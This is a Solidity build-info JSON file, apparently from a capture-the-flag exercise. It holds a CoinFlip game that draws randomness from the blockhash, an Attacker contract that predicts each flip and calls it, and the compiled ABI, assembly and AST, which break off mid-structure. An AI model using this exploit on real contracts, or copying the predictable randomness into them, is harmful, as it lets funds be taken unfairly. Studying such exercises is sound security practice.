{
	"id": "82dbb3c3ea15f71d9696709ecb0649e3",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/coinflip.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract CoinFlip {\r\n    uint256 public consecutiveWins;\r\n    uint256 lastHash;\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    constructor() {\r\n        consecutiveWins = 0;\r\n    }\r\n\r\n    function flip(bool _guess) public returns (bool) {\r\n        uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n        if (lastHash == blockValue) {\r\n            revert();\r\n        }\r\n\r\n        lastHash = blockValue;\r\n        uint256 coinFlip = blockValue / FACTOR;\r\n        bool side = coinFlip == 1 ? true : false;\r\n\r\n        if (side == _guess) {\r\n            consecutiveWins++;\r\n            return true;\r\n        } else {\r\n            consecutiveWins = 0;\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract Attacker{\r\n\r\n    CoinFlip coinflip;\r\n\r\n    uint256 lastHash;\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    constructor(address _address) {\r\n        coinflip = CoinFlip(_address);    \r\n    }\r\n    \r\n    function flip() public {\r\n        uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n        if(lastHash == blockValue){\r\n            revert();\r\n        }\r\n\r\n        lastHash = blockValue;\r\n        uint256 coinFlip = blockValue / FACTOR;\r\n        bool side = coinFlip == 1 ? true : false;\r\n\r\n        coinflip.flip(side);\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/coinflip.sol": {
				"Attacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_address",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "flip",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/coinflip.sol\":830:1443  contract Attacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/coinflip.sol\":922:999  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/coinflip.sol\":905:999  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/coinflip.sol\":1008:1090  constructor(address _address) {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/coinflip.sol\":1069:1077  _address */\n  dup1\n    /* \"contracts/coinflip.sol\":1049:1057  coinflip */\n  0x00\n  dup1\n    /* \"contracts/coinflip.sol\":1049:1078  coinflip = CoinFlip(_address) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/coinflip.sol\":1008:1090  constructor(address _address) {\r... */\n  pop\n    /* \"contracts/coinflip.sol\":830:1443  contract Attacker{\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"contracts/coinflip.sol\":830:1443  contract Attacker{\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/coinflip.sol\":830:1443  contract Attacker{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcde4efa9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":1102:1440  function flip() public {\r... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/coinflip.sol\":1136:1154  uint256 blockValue */\n      0x00\n        /* \"contracts/coinflip.sol\":1190:1191  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":1175:1187  block.number */\n      number\n        /* \"contracts/coinflip.sol\":1175:1191  block.number - 1 */\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n        /* \"contracts/coinflip.sol\":1165:1192  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/coinflip.sol\":1157:1193  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/coinflip.sol\":1136:1193  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":1221:1231  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":1209:1217  lastHash */\n      sload(0x01)\n        /* \"contracts/coinflip.sol\":1209:1231  lastHash == blockValue */\n      eq\n        /* \"contracts/coinflip.sol\":1206:1267  if(lastHash == blockValue){\r... */\n      iszero\n      tag_9\n      jumpi\n        /* \"contracts/coinflip.sol\":1247:1255  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":1206:1267  if(lastHash == blockValue){\r... */\n    tag_9:\n        /* \"contracts/coinflip.sol\":1290:1300  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":1279:1287  lastHash */\n      0x01\n        /* \"contracts/coinflip.sol\":1279:1300  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":1311:1327  uint256 coinFlip */\n      0x00\n        /* \"contracts/coinflip.sol\":1343:1349  FACTOR */\n      sload(0x02)\n        /* \"contracts/coinflip.sol\":1330:1340  blockValue */\n      dup3\n        /* \"contracts/coinflip.sol\":1330:1349  blockValue / FACTOR */\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n        /* \"contracts/coinflip.sol\":1311:1349  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":1360:1369  bool side */\n      0x00\n        /* \"contracts/coinflip.sol\":1384:1385  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":1372:1380  coinFlip */\n      dup3\n        /* \"contracts/coinflip.sol\":1372:1385  coinFlip == 1 */\n      eq\n        /* \"contracts/coinflip.sol\":1372:1400  coinFlip == 1 ? true : false */\n      tag_12\n      jumpi\n        /* \"contracts/coinflip.sol\":1395:1400  false */\n      0x00\n        /* \"contracts/coinflip.sol\":1372:1400  coinFlip == 1 ? true : false */\n      jump(tag_13)\n    tag_12:\n        /* \"contracts/coinflip.sol\":1388:1392  true */\n      0x01\n        /* \"contracts/coinflip.sol\":1372:1400  coinFlip == 1 ? true : false */\n    tag_13:\n        /* \"contracts/coinflip.sol\":1360:1400  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":1413:1421  coinflip */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/coinflip.sol\":1413:1426  coinflip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/coinflip.sol\":1427:1431  side */\n      dup3\n        /* \"contracts/coinflip.sol\":1413:1432  coinflip.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      pop\n        /* \"contracts/coinflip.sol\":1102:1440  function flip() public {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_22:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_24\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:428   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":266:268   */\n      0x20\n        /* \"#utility.yul\":254:263   */\n      dup3\n        /* \"#utility.yul\":245:252   */\n      dup5\n        /* \"#utility.yul\":241:264   */\n      sub\n        /* \"#utility.yul\":237:269   */\n      slt\n        /* \"#utility.yul\":234:236   */\n      iszero\n      tag_27\n      jumpi\n        /* \"#utility.yul\":282:283   */\n      0x00\n        /* \"#utility.yul\":279:280   */\n      dup1\n        /* \"#utility.yul\":272:284   */\n      revert\n        /* \"#utility.yul\":234:236   */\n    tag_27:\n        /* \"#utility.yul\":325:326   */\n      0x00\n        /* \"#utility.yul\":350:411   */\n      tag_28\n        /* \"#utility.yul\":403:410   */\n      dup5\n        /* \"#utility.yul\":394:400   */\n      dup3\n        /* \"#utility.yul\":383:392   */\n      dup6\n        /* \"#utility.yul\":379:401   */\n      add\n        /* \"#utility.yul\":350:411   */\n      tag_22\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":340:411   */\n      swap2\n      pop\n        /* \"#utility.yul\":296:421   */\n      pop\n        /* \"#utility.yul\":224:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":434:543   */\n    tag_29:\n        /* \"#utility.yul\":515:536   */\n      tag_31\n        /* \"#utility.yul\":530:535   */\n      dup2\n        /* \"#utility.yul\":515:536   */\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":510:513   */\n      dup3\n        /* \"#utility.yul\":503:537   */\n      mstore\n        /* \"#utility.yul\":493:543   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":549:759   */\n    tag_15:\n      0x00\n        /* \"#utility.yul\":674:676   */\n      0x20\n        /* \"#utility.yul\":663:672   */\n      dup3\n        /* \"#utility.yul\":659:677   */\n      add\n        /* \"#utility.yul\":651:677   */\n      swap1\n      pop\n        /* \"#utility.yul\":687:752   */\n      tag_34\n        /* \"#utility.yul\":749:750   */\n      0x00\n        /* \"#utility.yul\":738:747   */\n      dup4\n        /* \"#utility.yul\":734:751   */\n      add\n        /* \"#utility.yul\":725:731   */\n      dup5\n        /* \"#utility.yul\":687:752   */\n      tag_29\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":641:759   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":765:950   */\n    tag_11:\n      0x00\n        /* \"#utility.yul\":822:842   */\n      tag_36\n        /* \"#utility.yul\":840:841   */\n      dup3\n        /* \"#utility.yul\":822:842   */\n      tag_37\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":817:842   */\n      swap2\n      pop\n        /* \"#utility.yul\":856:876   */\n      tag_38\n        /* \"#utility.yul\":874:875   */\n      dup4\n        /* \"#utility.yul\":856:876   */\n      tag_37\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":851:876   */\n      swap3\n      pop\n        /* \"#utility.yul\":895:896   */\n      dup3\n        /* \"#utility.yul\":885:887   */\n      tag_39\n      jumpi\n        /* \"#utility.yul\":900:918   */\n      tag_40\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":885:887   */\n    tag_39:\n        /* \"#utility.yul\":942:943   */\n      dup3\n        /* \"#utility.yul\":939:940   */\n      dup3\n        /* \"#utility.yul\":935:944   */\n      div\n        /* \"#utility.yul\":930:944   */\n      swap1\n      pop\n        /* \"#utility.yul\":807:950   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":956:1147   */\n    tag_8:\n      0x00\n        /* \"#utility.yul\":1016:1036   */\n      tag_43\n        /* \"#utility.yul\":1034:1035   */\n      dup3\n        /* \"#utility.yul\":1016:1036   */\n      tag_37\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":1011:1036   */\n      swap2\n      pop\n        /* \"#utility.yul\":1050:1070   */\n      tag_44\n        /* \"#utility.yul\":1068:1069   */\n      dup4\n        /* \"#utility.yul\":1050:1070   */\n      tag_37\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1045:1070   */\n      swap3\n      pop\n        /* \"#utility.yul\":1089:1090   */\n      dup3\n        /* \"#utility.yul\":1086:1087   */\n      dup3\n        /* \"#utility.yul\":1083:1091   */\n      lt\n        /* \"#utility.yul\":1080:1082   */\n      iszero\n      tag_45\n      jumpi\n        /* \"#utility.yul\":1094:1112   */\n      tag_46\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1080:1082   */\n    tag_45:\n        /* \"#utility.yul\":1139:1140   */\n      dup3\n        /* \"#utility.yul\":1136:1137   */\n      dup3\n        /* \"#utility.yul\":1132:1141   */\n      sub\n        /* \"#utility.yul\":1124:1141   */\n      swap1\n      pop\n        /* \"#utility.yul\":1001:1147   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1153:1243   */\n    tag_32:\n      0x00\n        /* \"#utility.yul\":1230:1235   */\n      dup2\n        /* \"#utility.yul\":1223:1236   */\n      iszero\n        /* \"#utility.yul\":1216:1237   */\n      iszero\n        /* \"#utility.yul\":1205:1237   */\n      swap1\n      pop\n        /* \"#utility.yul\":1195:1243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1249:1326   */\n    tag_37:\n      0x00\n        /* \"#utility.yul\":1315:1320   */\n      dup2\n        /* \"#utility.yul\":1304:1320   */\n      swap1\n      pop\n        /* \"#utility.yul\":1294:1326   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1332:1512   */\n    tag_47:\n        /* \"#utility.yul\":1380:1457   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1377:1378   */\n      0x00\n        /* \"#utility.yul\":1370:1458   */\n      mstore\n        /* \"#utility.yul\":1477:1481   */\n      0x11\n        /* \"#utility.yul\":1474:1475   */\n      0x04\n        /* \"#utility.yul\":1467:1482   */\n      mstore\n        /* \"#utility.yul\":1501:1505   */\n      0x24\n        /* \"#utility.yul\":1498:1499   */\n      0x00\n        /* \"#utility.yul\":1491:1506   */\n      revert\n        /* \"#utility.yul\":1518:1698   */\n    tag_41:\n        /* \"#utility.yul\":1566:1643   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1563:1564   */\n      0x00\n        /* \"#utility.yul\":1556:1644   */\n      mstore\n        /* \"#utility.yul\":1663:1667   */\n      0x12\n        /* \"#utility.yul\":1660:1661   */\n      0x04\n        /* \"#utility.yul\":1653:1668   */\n      mstore\n        /* \"#utility.yul\":1687:1691   */\n      0x24\n        /* \"#utility.yul\":1684:1685   */\n      0x00\n        /* \"#utility.yul\":1677:1692   */\n      revert\n        /* \"#utility.yul\":1704:1820   */\n    tag_25:\n        /* \"#utility.yul\":1774:1795   */\n      tag_53\n        /* \"#utility.yul\":1789:1794   */\n      dup2\n        /* \"#utility.yul\":1774:1795   */\n      tag_32\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1767:1772   */\n      dup2\n        /* \"#utility.yul\":1764:1796   */\n      eq\n        /* \"#utility.yul\":1754:1756   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1810:1811   */\n      0x00\n        /* \"#utility.yul\":1807:1808   */\n      dup1\n        /* \"#utility.yul\":1800:1812   */\n      revert\n        /* \"#utility.yul\":1754:1756   */\n    tag_54:\n        /* \"#utility.yul\":1744:1820   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205eb699bca14c130a68669dc753d1d2205415858a009b8a27ce366bc7b8564a1f64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:805:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:1",
														"type": ""
													}
												],
												"src": "7:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:207:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "288:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "291:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "281:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "250:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:1"
															},
															"nodeType": "YulIf",
															"src": "243:2:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "305:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "320:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "334:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "324:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "349:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "395:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "406:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "391:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "391:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "415:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "359:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "359:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "349:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:1",
														"type": ""
													}
												],
												"src": "156:284:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "491:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "501:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "530:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "512:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "512:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "501:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "473:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "483:7:1",
														"type": ""
													}
												],
												"src": "446:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "593:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "603:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "618:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "625:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "614:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "614:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "603:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "575:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "585:7:1",
														"type": ""
													}
												],
												"src": "548:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "723:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "780:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "789:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "792:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "782:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "782:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "782:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "746:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "771:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "753:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "753:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "743:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "743:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "736:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "736:43:1"
															},
															"nodeType": "YulIf",
															"src": "733:2:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
